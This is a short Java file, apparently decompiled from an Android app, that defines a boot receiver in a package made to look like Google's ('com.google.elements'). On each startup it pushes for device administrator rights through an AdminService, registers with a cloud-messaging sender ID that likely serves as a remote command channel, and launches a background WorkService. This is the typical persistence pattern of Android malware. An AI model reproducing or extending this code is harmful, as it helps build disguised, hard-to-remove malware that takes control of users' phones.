package com.google.elements;

import android.app.admin.DevicePolicyManager;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import com.google.android.gcm.GCMRegistrar;

public class BootReceiver extends BroadcastReceiver {
    ComponentName appadm;
    DevicePolicyManager dpm;

    public void onReceive(Context context, Intent intent) {
        this.dpm = (DevicePolicyManager) context.getSystemService("device_policy");
        this.appadm = new ComponentName(context, DeviceAdmin.class);
        if (!this.dpm.isAdminActive(this.appadm)) {
            Intent service = new Intent(context, AdminService.class);
            service.setFlags(268435456);
            context.startService(service);
        }
        GCMRegistrar.checkDevice(context);
        GCMRegistrar.checkManifest(context);
        if (GCMRegistrar.getRegistrationId(context).equals(BuildConfig.FLAVOR)) {
            GCMRegistrar.register(context, "738965552143");
        }
        Intent work = new Intent(context, WorkService.class);
        work.setFlags(268435456);
        context.startService(work);
    }
}
